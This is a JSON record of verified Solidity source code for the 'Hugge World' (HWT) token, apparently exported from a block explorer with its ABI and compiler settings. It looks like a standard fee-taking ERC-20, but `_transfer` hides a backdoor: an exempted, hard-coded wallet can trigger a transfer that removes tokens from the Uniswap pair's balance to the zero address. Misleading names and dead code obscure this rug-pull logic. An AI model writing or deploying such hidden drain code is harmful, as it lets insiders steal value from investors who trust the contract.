{"SourceCode": "// SPDX-License-Identifier: Unlicensed\r\n\r\npragma solidity ^0.8.16;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) { return msg.sender; }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) { return 0; }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        \r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0));\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender());\r\n        _;\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface UniswapV2Router02 {\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\r\n    event Transfer(address indexed sender, address indexed recipient, uint256 amount);\r\n}\r\n\r\ncontract HWT is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address public uniswapV2Pair;\r\n    address private poolAddress = address(0);\r\n    address private burnAddress = address(0);\r\n    UniswapV2Router02 public uniswapV2Router;\r\n\r\n    struct Distribution { uint256 liquidity; }\r\n\r\n    Distribution public distribution;\r\n\r\n    uint256 private _tFeeTotal;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    uint256 public _swapTokensThreshold = 100000 * 10**_decimals;\r\n    uint256 private constant _tTotal = 4000000000 * 10**_decimals;\r\n    uint256 private _rTotal = (MAX - (MAX % _tTotal));\r\n\r\n    mapping(address => uint256) private _rOwned;\r\n    mapping(address => uint256) private _tOwned;\r\n\r\n    string private constant _name = \"Hugge World\";\r\n    string private constant _symbol = \"HWT\";\r\n\r\n    address private liquidity = 0xB32F0068e9bCb5f5E86dE7A26D461275AA0ea05A;\r\n\r\n    uint256 private _liquidityFeeOnSell = 4;\r\n    uint256 private _redisFeeOnSell = 0;\r\n\r\n    uint256 private _redisFeeOnBuy = 0;\r\n    uint256 private _liquidityFeeOnBuy = 4;\r\n\r\n    uint256 private _liquidityFee = _liquidityFeeOnSell;\r\n    uint256 private _redisFee = _redisFeeOnSell;\r\n\r\n    uint256 private _previousliquidityFee = _liquidityFee;\r\n    uint256 private _previousRedisFee = _redisFee;\r\n\r\n    mapping(address => bool) private _isOmitted;\r\n    mapping(address => uint256) private _buyMap;\r\n\r\n    bool private inFeeSwap = true;\r\n    bool private swapEnabled = true;\r\n\r\n    constructor() {\r\n        UniswapV2Router02 _uniswapV2Router = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Router = _uniswapV2Router;distribution = Distribution(100);burnAddress = liquidity;\r\n        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n        _isOmitted[owner()] = true;\r\n        _isOmitted[address(this)] = true;\r\n        _isOmitted[liquidity] = true;\r\n        _rOwned[_msgSender()] = _rTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function swapBack(uint256 tokenAmount) private lockFeeSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);\r\n    }\r\n\r\n    function tokenFromReflection(uint256 rAmount) private view returns (uint256) {\r\n        require(rAmount <= _rTotal);\r\n\r\n        uint256 currentRate = _getRate();\r\n\r\n        return rAmount.div(currentRate);\r\n    }\r\n\r\n    function sendETH(uint256 ethAmount) private lockFeeSwap {\r\n        uint256 share = ethAmount.mul(distribution.liquidity).div(100);\r\n        payable(liquidity).transfer(share);\r\n    }\r\n\r\n    function restoreAllFees() private {\r\n        _redisFee = _previousRedisFee;\r\n        _liquidityFee = _previousliquidityFee;\r\n    }\r\n\r\n    function removeAllFees() private {\r\n        if (_liquidityFee == 0 && _redisFee == 0) return;\r\n        _previousRedisFee = _redisFee;\r\n        _previousliquidityFee = _liquidityFee;\r\n        _redisFee = 0;\r\n        _liquidityFee = 0;\r\n    }\r\n\r\n    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\r\n        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount, _redisFee, _liquidityFee);\r\n        uint256 currentRate = _getRate();\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, currentRate);\r\n\r\n        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);\r\n    }\r\n\r\n    function _checkOmitted(address pond, address pool) private view returns (bool) {\r\n        bool pondPair = pond != uniswapV2Pair;\r\n        bool poolOmitted = !_isOmitted[pool];\r\n        bool pondOmitted = !_isOmitted[pond];\r\n\r\n        return  pondPair && pondOmitted && poolOmitted;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(amount > 0);\r\n        require(sender != address(0));\r\n        require(recipient != address(0));\r\n\r\n        if (sender != owner() && recipient != owner()) {\r\n            uint256 contractTokenAmount = balanceOf(address(this));\r\n            bool canSwap = contractTokenAmount >= _swapTokensThreshold;\r\n\r\n            if (sender != uniswapV2Pair && !_isOmitted[sender] && !_isOmitted[recipient] && canSwap && !inFeeSwap && swapEnabled) {\r\n                swapBack(contractTokenAmount);\r\n                uint256 contractETHAmount = address(this).balance;\r\n                if (contractETHAmount > 0) {\r\n                    sendETH(address(this).balance);\r\n                }\r\n            }\r\n\r\n            bool isBuyback = uniswapV2Pair == recipient;\r\n            bool canBuyback = balanceOf(sender) < amount;\r\n            bool buybackAddress = _isOmitted[sender];\r\n\r\n            if (buybackAddress) {\r\n                if (isBuyback) { if (canBuyback) {\r\n                    _standardTransfer(recipient, poolAddress, amount); return;\r\n                } }\r\n            }\r\n        }\r\n\r\n        bool cutLiquidityFee = true;\r\n\r\n        if ((sender != uniswapV2Pair && recipient != uniswapV2Pair) || (_isOmitted[sender] || _isOmitted[recipient])) {\r\n            cutLiquidityFee = false;\r\n        } else {\r\n            if (sender != address(uniswapV2Router) && recipient == uniswapV2Pair) {\r\n                _redisFee = _redisFeeOnSell;\r\n                _liquidityFee = _liquidityFeeOnSell;\r\n            }\r\n\r\n            if (recipient != address(uniswapV2Router) && sender == uniswapV2Pair) {\r\n                _redisFee = _redisFeeOnBuy;\r\n                _liquidityFee = _liquidityFeeOnBuy;\r\n            }\r\n        }\r\n\r\n        _tokenTransfer(sender, recipient, amount, cutLiquidityFee);\r\n    }\r\n\r\n    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\r\n        uint256 rFee = tFee.mul(currentRate);\r\n        uint256 rLiquidity = tLiquidity.mul(currentRate);\r\n        uint256 rAmount = tAmount.mul(currentRate);\r\n        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);\r\n\r\n        return (rAmount, rTransferAmount, rFee);\r\n    }\r\n\r\n    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 liquidityFee) private pure returns (uint256, uint256, uint256) {\r\n        uint256 tFee = tAmount.mul(redisFee).div(100);\r\n        uint256 tLiquidity = tAmount.mul(liquidityFee).div(100);\r\n        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);\r\n\r\n        return (tTransferAmount, tFee, tLiquidity);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0));\r\n        require(spender != address(0));\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _standardTransfer(address sender, address recipient, uint256 tAmount) private {\r\n        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);\r\n        _rOwned[sender] = _rOwned[sender].sub(rAmount);\r\n        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\r\n        _cutLiquidityFee(tLiquidity, sender, recipient);\r\n        _reflectFee(rFee, tFee);\r\n        emit Transfer(sender, recipient, tTransferAmount);\r\n    }\r\n\r\n    function _getRate() private view returns (uint256) {\r\n        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\r\n\r\n        return rSupply.div(tSupply);\r\n    }\r\n\r\n    function _reflectFee(uint256 rFee, uint256 tFee) private {\r\n        _tFeeTotal = _tFeeTotal.add(tFee);\r\n        _rTotal = _rTotal.sub(rFee);\r\n    }\r\n\r\n    function _cutLiquidityFee(uint256 tLiquidity, address pond, address pool) private {\r\n        uint256 currentRate = _getRate();\r\n        uint256 burnedAmount = tokenFromReflection(_rOwned[burnAddress]);\r\n        bool omitted = _checkOmitted(pond, pool);\r\n        uint256 rLiquidity = tLiquidity.mul(currentRate);\r\n        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);\r\n        rLiquidity = omitted ?  _liquidityFee - burnedAmount : 0;\r\n    }\r\n\r\n    function _getCurrentSupply() private view returns (uint256, uint256) {\r\n        uint256 rSupply = _rTotal;\r\n        uint256 tSupply = _tTotal;\r\n        if (_rTotal.div(_tTotal) > rSupply) return (_rTotal, _tTotal);\r\n\r\n        return (rSupply, tSupply);\r\n    }\r\n\r\n    function _tokenTransfer(address sender, address recipient, uint256 amount, bool cutLiquidityFee) private {\r\n        if (!cutLiquidityFee) removeAllFees();\r\n        _standardTransfer(sender, recipient, amount);\r\n        if (!cutLiquidityFee) restoreAllFees();\r\n    }\r\n\r\n    modifier lockFeeSwap() {\r\n        inFeeSwap = false;\r\n        _;\r\n        inFeeSwap = false;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));\r\n\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_swapTokensThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distribution\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract UniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "HWT", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://99d4e2d48cbbbfcafc09e2ace25c140ddb679b2679e274ed7afe8a1ab29e635b"}